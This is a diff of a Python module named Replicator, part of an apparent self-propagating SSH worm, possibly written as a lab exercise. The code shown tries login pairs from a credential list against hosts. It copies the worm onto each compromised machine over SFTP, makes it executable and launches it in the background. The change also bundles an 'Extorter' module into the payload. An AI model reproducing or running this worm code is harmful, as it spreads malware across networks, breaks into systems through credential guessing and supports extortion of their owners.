@@ -4,9 +4,6 @@ import socket
 import os
 import shutil
 import subprocess
-import errno
-
-DEBUG = True
 
 try:
 	dprint
@@ -18,9 +15,7 @@ except:
 class Replicator(object):
 
 	# The file marking whether the worm should spread
-
 	INFECTED_MARKER_FILE      = "/tmp/infected.txt"
-	WORM_FILE                 = "/tmp/worm.py"
 	DEBUG_OUTPUT_FILE         = "/tmp/output.txt"
 	HOST_MARKER_FILE          = "/tmp/host.txt"
 	COMPILE_TMP_DIRECTORY     = ".tmp"
@@ -35,30 +30,33 @@ class Replicator(object):
 	host           = None
 	credentialList = None
 
-	def __init__(self, credList):
+	def __init__(self, credList, debug=True):
 		self.credentialList = credList
 		self.sshClient = paramiko.SSHClient()
 		self.sshClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+		self.debug = debug
 
-	def spreadAndExecute(self, isHost):
+	def spreadAndExecute(self, isHost, executionFile):
 
 		if isHost:
-			self.compileWorm()
-			self.getSftpClient().put(Replicator.COMPILE_TMP_DIRECTORY + "/worm.py", Replicator.WORM_FILE)
+			self.compileWorm(executionFile, isHost)
+			self.getSftpClient().put(Replicator.COMPILE_TMP_DIRECTORY + "/" + os.path.basename(executionFile), executionFile)
 		else:
-			self.getSftpClient().put("/tmp/worm.py", Replicator.WORM_FILE)
+			self.getSftpClient().put(executionFile, executionFile)
 
-		self.sshClient.exec_command("chmod a+x " + Replicator.WORM_FILE)
+		self.sshClient.exec_command("chmod a+x " + executionFile)
 
-		if DEBUG:
-			# self.sshClient.exec_command("nohup python " + Replicator.WORM_FILE + " > " + Replicator.DEBUG_OUTPUT_FILE + " 2>&1 &")
-			self.sshClient.exec_command("nohup python " + Replicator.WORM_FILE + " >> " + Replicator.DEBUG_OUTPUT_FILE + " &")
+		if self.debug:
+			self.sshClient.exec_command("nohup python " + executionFile + " > " + Replicator.DEBUG_OUTPUT_FILE + " 2>&1 &")
+			# self.sshClient.exec_command("nohup python " + executionFile + " >> " + Replicator.DEBUG_OUTPUT_FILE + " &")
 		else:
-			self.sshClient.exec_command("nohup python " + Replicator.WORM_FILE + " &")
+			self.sshClient.exec_command("nohup python " + executionFile + " &")
 
 
 	def tryCredentials(self, host, username, password):
 		try:
+			# Reset the sftp client
+			self.sftpClient = None
 			self.sshClient.connect(host, username=username, password=password)
 
 		except socket.error:
@@ -70,7 +68,9 @@ class Replicator(object):
 
 		return Replicator.SUCCESSFUL_CONNECTION
 
-	def compileWorm(self):
+	def compileWorm(self, executionFile, isHost=False):
+
+		baseFile = os.path.basename(executionFile)
 
 		# Create temporary directory to put the generated file
 		if os.path.isdir(Replicator.COMPILE_TMP_DIRECTORY):
@@ -79,22 +79,28 @@ class Replicator(object):
 		os.makedirs(Replicator.COMPILE_TMP_DIRECTORY)
 
 		# Copy worm.py
-		shutil.copy2("worm.py", Replicator.COMPILE_TMP_DIRECTORY)
+		shutil.copy2(baseFile, Replicator.COMPILE_TMP_DIRECTORY)
 
-		# Get the contents of Replicator.py
-		f = open("Replicator.py", "r")
-		replicatorContents = f.read()
-		f.close()
+		fExecFile = open(baseFile, "r")
+		fExecContents = fExecFile.read()
+		fExecFile.close()
 
-		# Get the contents of worm.py
-		f = open("worm.py", "r")
-		wormContents = f.read()
-		f.close()
+		filesToInject = [("Replicator.py", "from Replicator" + " import Replicator"),
+			("Extorter.py", "from Extorter" + " import Extorter")]
+
+		for file, injectStatement in filesToInject:
+			f = open(file, "r")
+			fContents = f.read()
+			f.close()
+
+			fExecContents = fExecContents.replace(injectStatement, fContents, 1)
+
+		if isHost:
+			fExecContents = fExecContents.replace("hostIP = None", "hostIP = '" + Replicator.getMyIP('eth2') + "'")
 
 		# Find the location in worm.py to dump the Replicator class in
-		f = open(Replicator.COMPILE_TMP_DIRECTORY + "/worm.py", "w")
-		wormContents = wormContents.replace("from Replicator import Replicator", replicatorContents)
-		f.write(wormContents)
+		f = open(Replicator.COMPILE_TMP_DIRECTORY + "/" + baseFile, "w")
+		f.write(fExecContents)
 		f.close()
 
 	def deleteCompiledWorm(self):
@@ -109,7 +115,7 @@ class Replicator(object):
 			attemptResults = self.tryCredentials(host, username, password)
 
 			if attemptResults == Replicator.SUCCESSFUL_CONNECTION:
-				dprint('(' + username + ', ' + password + '): ' + Replicator.desc(attemptResults), DEBUG)
+				dprint('(' + username + ', ' + password + '): ' + Replicator.desc(attemptResults), self.debug)
 				return (attemptResults, self.sshClient) # Possibly need a copy of the instance?
 
 		return (attemptResults, None)
@@ -131,7 +137,9 @@ class Replicator(object):
 		try:
 			sftp.stat(path)
 			return True
-		except IOError as e:
+		except IOError:
+			return False
+		except:
 			return False
 
 	@staticmethod
